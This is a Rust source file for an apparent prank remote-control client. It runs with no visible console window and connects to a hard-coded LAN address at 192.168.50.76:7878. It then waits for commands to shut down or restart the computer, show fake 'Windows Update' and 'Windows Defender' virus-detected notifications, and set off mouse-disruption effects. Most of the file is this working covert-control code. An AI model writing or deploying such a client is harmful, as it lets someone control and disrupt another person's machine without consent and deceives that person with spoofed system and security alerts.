#![windows_subsystem = "windows"]
use std::{
    io::{Read, Write},
    net::TcpStream,
    sync::{Arc, Mutex},
};

mod links;
mod power;
mod thread;

const BUFFER_SIZE: usize = 6;

const FLAG_POWER_ACTION: u8 = 0b00000001;
const FLAG_NOTIFY: u8 = 0b00000010;
const FLAG_MISC: u8 = 0b00000100;

const FLAG_POWER_SHUTDOWN: u8 = 0b00000001;
const FLAG_POWER_RESTART: u8 = 0b00000010;

const FLAG_NOTIFY_FAKE_UPDATE: u8 = 0b00000001;
const FLAG_NOTIFY_VIRUS_DETECTED: u8 = 0b00000010;

const FLAG_MISC_RUNAWAY: u8 = 0b00000001;
const FLAG_MISC_MOUSE_GRAVITY: u8 = 0b00000010;

fn main() -> Result<(), Box<dyn std::error::Error>> {
    println!("Connection Attempt...");
    let mut stream = TcpStream::connect("192.168.50.76:7878")?;

    let flags: Arc<Mutex<u8>> = Arc::new(Mutex::new(0b00000000));
    let flags_2 = flags.clone();

    std::thread::spawn(|| {
        unsafe {
            thread::do_loop(flags_2);
        };
    });

    stream.write(&[1])?;
    println!("Connected");
    loop {
        let mut dat: [u8; BUFFER_SIZE] = [0; BUFFER_SIZE];
        stream.read(&mut dat)?;
        match dat[0] {
            FLAG_POWER_ACTION => {
                println!("Power Action Signal");
                power::power_action(dat[1]);
            }
            FLAG_NOTIFY => match dat[1] {
                FLAG_NOTIFY_FAKE_UPDATE => {
                    println!("Notify Signal; Fake Update");
                    notify_rust::Notification::new()
                        .summary("Windows Update")
                        .body("An update is avaliable for your computer. Install it to access the newer features")
                        .appname("Windows Updates")
                        .finalize()
                        .timeout(0)
                        .show()?;
                }
                FLAG_NOTIFY_VIRUS_DETECTED => {
                    println!("Notify Signal; Virus Detected");
                    notify_rust::Notification::new()
                        .summary("Windows Defender")
                        .body("A virus was detected in your computer. Please take action immediately.")
                        .appname("Windows Defender")
                        .finalize()
                        .timeout(0)
                        .show()?;
                }
                _ => {}
            },
            FLAG_MISC => match dat[1] {
                FLAG_MISC_RUNAWAY => loop {
                    let mut flags = match flags.as_ref().try_lock() {
                        Ok(f) => f,
                        Err(_err) => {
                            continue;
                        }
                    };

                    *flags = *flags | thread::FLAG_RUNAWAY;
                    break;
                },
                FLAG_MISC_MOUSE_GRAVITY => loop {
                    // Loop needed in case first mutex lock is unsuccesful
                    let mut flags = match flags.as_ref().try_lock() {
                        Ok(f) => f,
                        Err(_err) => {
                            continue;
                        }
                    };

                    *flags = *flags | thread::FLAG_MOUSE_GRAVITY;
                    break;
                },
                _ => {}
            },
            _ => {
                continue;
            }
        }
    }
}
